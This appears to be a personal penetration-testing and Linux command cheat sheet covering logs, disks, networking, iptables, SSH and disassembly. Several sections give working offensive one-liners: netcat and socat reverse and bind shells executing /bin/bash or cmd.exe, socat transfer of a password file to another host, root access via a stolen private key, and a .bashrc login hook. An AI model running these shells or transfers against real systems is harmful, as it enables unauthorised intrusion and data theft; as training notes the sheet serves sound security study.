### Show logger
who  
last  
/var/log 检查日志

### Disk Partition
lsblk  
sudo fdisk -l

### Show network connections
netstat -natup  
ss -natup

### Copy file from remote machine to local tmp
scp john@localhost:/var/tmp/CopyMe.txt /tmp  
scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2  
scp -P 2222 student@192.168.79.112:/usr/share/kali-defaults/web/img/password.png /home/kali/

### echo current shell
echo $SHELL

### echo environmental variable
env

### Sed
###### extract first 1-1000 lines
```
sed -n '1,1000p' file
```

### NC transfering files
```
nc -lvnp 6666 > incoming.txt
nc -nv 192.168.65.61 6666 < incoming.txt
```

### NC bind shell
```
nc -nlvp 4444 -e cmd.exe
nc -nv 10.11.0.22 4444
```

### NC reverse shell
```
nc -nlvp 4444
nc -nv 10.11.0.22 4444 -e /bin/bash
```

### Socat connect remote machine
```
socat - TCP4:ip-address:80
```
### Socat encrypted bind shell
```
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 30 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem

sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
socat - OPENSSL:192.168.22.31:443,verify=0

socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT
socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:/bin/bash
windows:socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:'cmd.exe',pipes
```

### Socat transfer files
```
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt  
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

### Socat reverse shell
```
socat -d -d TCP4-LISTEN:443 STDOUT(shell listener)
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
socat - TCP4:172.16.53.20:456(shell connection)
```

### IPTables
```
sudo iptables -L (show iptables) --line-numbers(optional)
Append a rule to the INPUT chain for a source network of 192.168.1.0/24 for all protocols: sudo iptables -s 192.168.1.0/24 -p all -A(append)/D(delete)/I(insert) INPUT
sudo iptables -s 127.0.0.1 -d 127.0.0.1 -A INPUT
sudo iptables -s 192.168.1.37 -p tcp -A INPUT
sudo iptables -D INPUT 5(linenumber)
sudo iptables -nvL(show traffic)
sudo iptables -P FOWARD DROP(change default policy of forward to drop)
sudo iptables -R(replace) INPUT 1 -s 192.168.1.37 -d 127.0.0.1 -p tcp --dport 8080
Final: sudo iptables-save
```

#### stateful firewall
**INVALID**: The packet is associated with no known connection.  
**NEW**: The packet has started a new connection or otherwise associated with a connection that has not seen packets in both directions.  
**ESTABLISHED**: The packet is associated with a connection that has seen packets in both directions.  
**RELATED**: The packet is starting a new connection, but is associated with an existing connection, such as an FTP data transfer or an ICMP error.  
**UNTRACKED**: The packet is not tracked at all, which happens if you explicitly un-track it by using -j CT --notrack in the raw table.  
```
sudo iptables -I INPUT 1 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
sudo iptables -I INPUT 2 -m conntrack --ctstate INVALID -j DROP
sudo iptables -L --line-numbers
```


### Tcpdump
sudo tcpdump -i any -w file.pcap

### Find
find /usr -type f -exec md5sum {} + | grep "d61d579501ab8ff507120780191929d5"
> find only files under usr with hash value d61----



### SSH 免密登录(manual way: copied over the id_rsa.pub file to authorized_keys)
> First way:  
> ssh-keygen  
> ssh-copy-id -i /home/kali/.ssh/id_rsa.pub kali@remote_ip  
> Second way:  
> ssh-keygen  
> ssh-copy-id remote-username@remote_ip  

###### Using root's private key to gain root access
chmod 400 private_key  
ssh -i private_key username@remote_ip  

### Systemd
journalctl -u network.service(See network service messages)  
systemctl show service(Show properties of a service or other unit)  
journalctl(Show all collected log messages)  
journalctl -k(Show only kernel messages)

### list commands current users can/can't execute 
sudo -l

### Use of .bashrc or .zshrc(check shell you are using first)
make persistent alias by adding (alias ..='cd')  
execute command when user logins in by adding command (echo "xingdi")

### Ndisasm
```
ndisasm [-a] [-i] [-h] [-r] [-u] [-b bits] [-o origin] [-s sync...]
               [-e bytes] [-k start,bytes] [-p vendor] file
   -a or -i activates auto (intelligent) sync
   -u same as -b 32
   -b 16, -b 32 or -b 64 sets the processor mode
   -h displays this text
   -r or -v displays the version number
   -e skips <bytes> bytes of header
   -k avoids disassembling <bytes> bytes from position <start>
   -p selects the preferred vendor instruction set (intel, amd, cyrix, idt)
```

